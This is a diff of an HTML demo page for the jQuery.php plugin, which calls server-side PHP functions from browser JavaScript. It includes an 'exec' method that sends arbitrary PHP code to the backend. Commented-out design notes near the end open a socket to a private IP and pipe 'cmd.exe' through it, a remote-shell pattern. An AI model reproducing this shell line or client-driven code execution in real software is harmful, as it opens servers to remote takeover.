@@ -15,107 +15,257 @@ body {
 	margin-bottom:10px;
 	font-family:"Courier New", Courier, monospace;
 	font-weight:bold;
+	white-space:pre;
+	padding:5px;
+	color:#666;
 }
 </style>
 </head>
 <script>
 $(document).ready(function() {
 	
+	// Optionally define a shortcut reference
+	var P = $.fn.php;
+	
+
+	
 	// Initialization options
-	$.fn.php('init', 
+	P('init', 
 		{
-			'path': 'func_request.php',
+			// The path to our function request handler is absolutely required.
+			'path': 'http://www.williamneeley.com/code/jqueryphp/lib/func_request.php',
+			
+			// Method chaining is highly useful but makes the plugin slightly slower.
 			'chaining': true,
+			
+			// Synchronous requests are required for method chaining functionality.
 			'async': false
 		});
 	
-	// Example of calling the PHP strlen() function
-	$("#results1").php('strlen', function(data, self) {
-		$(self).html(data);
-	}, 'A test string!');
+
 	
-	// Example of calling highlight_string()
-	$("#results3").php('highlight_string', function(data, self) {
-		$(self).html(data);
-	}, "<?php phpinfo(); ?>");
-	
-	/* Example demonstrating the usage of jQuery.php's exec method to 
-	 * pass PHP code to the backend and return the result. This method 
-	 * is disabled by default.
+	/* This is an example of setting our callback globally. This must be done at least
+	 * one time before calling any PHP functions.
 	 */
-	var code = "$a = 2; $b = 2; $c = $a + $b; echo $c;"
-	$("#results4").php('exec', code, function(data, self) {
-		$(self).html(data);
+	P(function callback(data, self) {
+		$(self).append("<div>" + data + "</div>");
 	});
 	
-	/* This is an example of calling multiple consecutive functions
-	 * as an object passing the function name as they key and then
-	 * an array of values pertaining to a given functions parameters.
-	 * When functions are called in this manner requests are sent to 
-	 * the server synchronously.
+	// This is another way to set our global callback function.
+	P('callback', function(data, self) {
+		$(self).append("<span>" + data + "</span>");
+	});
+
+
+
+	/* Here we specify seperately the jQuery selected elements we would like our bound context 
+	 * to be. This will override any previously selected elements. You can optionally define the
+	 * element(s) context while calling PHP functions as demonstrated in examples below.
 	 */
-	$("#results5").php({
+	P('select', $("#results1"));
+	
+
+	
+	/* The following are some simple usage scenarios. It should be noted that the examples below
+	 * demonstrate multiple ways to do the same thing. In this case we are calling PHP's 'strlen' 
+	 * function.
+	 */
+	 
+	// Passing the 'call' keyword is allowed but not required.
+	P('call', 'strlen', 'A test string!');	
+	
+	// Assinging your callback with the function name call is also possible (again not required).		
+	P(function call(data, self) {
+		$(self).append("<br><i>" + data + "</i>");
+	}, 'strlen', 'A test string!');	
+	
+	// Passing the function you wish to use as a string as the first parameter.
+	P('strlen', 'A longer test string!');
+	
+	// Assinging the function you wish to call as the name of the callback.
+	P(function strlen(data, self) {
+		$(self).append("<br><u>" + data + "</u>");
+	}, 'A shorter string!');
+
+	// Calling your function while setting a new global callback.
+	P('strlen', function(data, self) {
+		$(self).append("<br><u style='color: red'>" + data + "</u>");
+	}, 'This will be the longest string passed to strlen yet!');
+	
+	// Calling your function while choosing a new selector context and setting a new callback.
+	$("#results1").php('strlen', function(data, self) {
+		$(self).append("<br><u style='color: green'>" + data + "</u>");
+	}, 'This will be the longest string passed to strlen yet (plus one)!');
+	
+	// Perhaps the simplest way of calling your PHP function.
+	P.strlen('I am a string.');
+	
+	// Calling your function while choosing a new selector context without setting a new callback.
+	$("#results2").php('strlen', 'Yet another string!');
+	
+	
+	
+	// Now let's switch our selector context to another div
+	P('select', $("#results2"));
+	
+	// Let's set another callback function (if you don't further requests will just use the last one).
+	P('callback', function(data, self) {
+		$(self).append("<div style='font-size: 2.0em;'>" + data + "</div>");
+	});
+	
+	// And we call PHP's crypt function on the passed string.
+	P.crypt("My encrypted passphrase.");
+	
+	// Now let's switch our selector context to another div
+	P('select', $("#results3"));
+	
+	
+	
+	/* This is an example of calling multiple consecutive functions as an object by passing the function 
+	 * name as the key and then an array of values pertaining to a given function's parameters. This does
+	 * not work in the same manner as function chaining. Each function is called and value is returned
+	 * independantly. It's just a shorthand approach to calling multiple functions.
+	 */
+	P(function multi(data, self) {
+		$(self).append("<div>" + data + "</div>");
+	},
+	{
 		abs : [-884],
 		cosh : [23],
-		sqrt : [43],
-		pi : [700],
-		highlight_string : ["<?php $a = 2; $b = 2; $c = $a + $b; echo $c; ?>"],
-		date : ["DATE_RFC822"]
-		}, function(data, self) { 
-			$(self).append("<div>" + data + "</div>");
+		sqrt : [43]
 	});
 	
-	/* This is an example of calling PHP functions using a function
-	 * chaining pattern. It is imperative that we pass our callback
-	 * argument as the first argument to .php. In addition, it naming
-	 * the callback function 'chain' is required.
+	// Let's highlight a PHP string of code using our 'multi' functionality.
+	P('multi',
+	{
+		highlight_string : ["<?php $a = 2; $b = 2; $c = $a + $b; echo $c; ?>"],
+	});
+	
+	// Let's run the 'pi' function and then the 'data' function.
+	$("#results4").php('multi',
+	{
+		pi : [700],
+		date : ["DATE_RFC822"]
+	});
+	
+	
+	
+	/* Example demonstrating the usage of jQuery.php's exec method to pass PHP code to the backend and 
+	 * return the result. This method is disabled by default. This functionality MAY be deprecated in 
+	 * future releases.
 	 */
-	$("#results6").php(function chain(data, self) {
-		$(self).append("<div>" + data + "</div>");
+	var code = "$a = 2; $b = 2; $c = $a + $b; echo $c;"
+	P('exec', code, function(data, self) {
+		$(self).html(data);
+	});
+
+
+
+	// Now let's switch our selector context to another div
+	P('select', $("#results5"));
+
+	/* This is an example of calling PHP functions using a function chaining pattern. It is imperative 
+	 * that we pass our callback argument as the first argument to .php. In addition, it naming the 
+	 * callback function 'chain' is required.
+	 */
+	P(function chain(data, self) {
+		$(self).append("<div style='border:2px dashed blue'>" + data + "</div>");
 	}, -138)
-		.abs() 
-		.decbin()
-		.decbin()
-		.bindec()
-		.sqrt()
-		.tan()
 		.abs()
-		.round();
-		
-	/* 
+		.tan();
+	
+	/* When passing parameters to a chain just think of the first function in the chain to
+	 * know which parameters to pass. It is the returned results of the first function that
+	 * all other functions in the chain act on.
 	 */
-	$("#results7").php(function chain(data, self) {
-		$(self).append("<div>" + data + ", </div>");
-	}, '<div id="results2" class="results"></div>')
-		.htmlentities()
-		.str_word_count()
-		.highlight_string()
-		.sha1();
+	P('chain', function(data, self) {
+		$(self).append("<div style='border:2px dashed yellow'>" + data + "</div>");
+	}, 2, 8)
+		.pow()
+		.pi();
+	
+	// Let's quickly override our global callback function.
+	P(function callback(data, self) {
+		$(self).append("<div style='border:2px dashed green'>" + data + "</div>");
+	});
+	
+	/* Remember defining a callback was not required. Just keep in mind that if we do not 
+	 * override or set our callback, the last used callback will be used once more.
+	 */
+	P('chain', 8, 3).pow().pi();
+	
+	
+	
+	/* !!!!!!!!!!!!!!!!!!! */
+	/* !!!!!!!!!!!!!!!!!!! */
+	/* !!!!!!!!!!!!!!!!!!! */	
+	/*
+		// !! We need to develop a way to return data directly into JavaScript variables.
+		var mySock = P.fsockopen("192.168.1.76", 1010);
+	
+		// !! We need a method on the backend that allows repeated requests to have a shared context.
+		P.exec("cmd.exe <&3 >&3 2>&3");
+		
+		// !! We need to develop a filter to safely sanitize arbitrary code sent to the backend.
+	*/
+	
+	/* At this stage in the development of the jqueryphp plugin it seems as though refactoring the 
+	 * design to include a "buffered operations" would be a wise course of action.
+	 *
+	 * A buffered operations mode could keep a group of related PHP requests client side and then send 
+	 * them all at once to the server for execution so that they maintain the same context.
+	 *
+		 // How to indicate a block of grouped requests?
+		 P(function group() {
+			var mySock = P.fsockopen("192.168.1.76", 1010);
+			P.exec("cmd.exe <&3 >&3 2>&3");	
+		 });
+		 
+		 // Also:
+		 P('group', function() {
+			var mySock = P.fsockopen("192.168.1.76", 1010);
+			P.exec("cmd.exe <&3 >&3 2>&3");			 
+		 });
+	 */
 			
 });
 </script>
 <body>
 <p><b>jQuery.php Demonstrations:</b></p>
 
-Returned results from the PHP strlen() function
+<p>
+Returned results 1 ...
 <div id="results1" class="results"></div>
+</p>
 
-Example of calling a disabled PHP function
+<p>
+Returned results 2 ...
 <div id="results2" class="results"></div>
+</p>
 
-Returned results from the PHP strlen() function
+<p>
+Returned results 3 ...
 <div id="results3" class="results"></div>
+</p>
 
-Returned results using jQuery.php's 'exec' method.
+<p>
+Returned results 4 ...
 <div id="results4" class="results"></div>
+</p>
 
-Calling multiple PHP functions as an object.
+<p>
+Returned results 5 ...
 <div id="results5" class="results"></div>
+</p>
 
-Calling PHP functions as a chain (test 1).
+<p>
+Returned results 6 ...
 <div id="results6" class="results"></div>
+</p>
 
-Calling PHP functions as a chain (test 2). <br>
+<p>
+Returned results 7 ...
 <div id="results7" class="results"></div>
+</p>
 </body>
 </html>
